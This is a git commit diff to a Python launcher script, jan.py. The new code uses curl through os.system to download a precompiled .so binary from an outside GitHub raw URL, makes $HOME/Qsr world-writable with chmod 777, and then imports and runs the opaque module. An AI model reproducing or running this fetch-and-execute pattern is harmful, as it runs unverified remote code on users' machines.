b62573e385e315ffd6cb9d32bb6d74c3fa24c954
Qaiser Abbas <69212320+TechQaiser@users.noreply.github.com>
2022-12-31 13:50:08 -0800

    Add files via upload

--- jan.py
+++ jan.py
@@ -1,7 +1,17 @@
-import os
-
-os.system('git pull')
-
-import qsr
-
-qsr.buy()
+import re,os,sys
+try:
+    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
+    if not os.path.exists("pycrypto_qsr.cpython-311.so"):
+        os.system("chmod 777 $HOME/Qsr")
+        os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
+        import qsr
+        qsr.buy()
+    else:
+        import qsr
+        qsr.buy()
+except PermissionError:
+    exit('Permission Error ! Found')
+except ConnectionError:
+    exit('Network Error ! Found')
+except Exception as e:
+    print(e)
